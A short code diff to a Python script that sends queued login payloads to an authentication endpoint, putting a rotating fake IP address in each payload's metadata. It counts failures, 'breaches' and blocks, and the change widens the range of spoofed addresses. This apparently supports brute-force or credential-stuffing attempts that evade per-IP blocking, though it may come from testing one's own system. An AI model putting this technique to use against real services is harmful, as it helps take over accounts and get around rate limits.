@@ -28,7 +28,7 @@ headers = {
 failedAuth = 0
 sucessfulBreach = 0
 blocked = 0
-ip_count = 6
+ip_count = 51
 
 class ThreadClass(threading.Thread):
     count = 0
@@ -47,8 +47,8 @@ class ThreadClass(threading.Thread):
             payload = self.q.get()
             payload["metadata"]['IP'] = "1.1.1." + str(ip_count)
             ip_count += 1
-            if ip_count > 15:
-                ip_count = 6
+            if ip_count > 150:
+                ip_count = 51
             response = requests.request("POST", url, headers=headers, data=json.dumps(payload))
             data = response.json()
             if (data['Authentication'] == True):
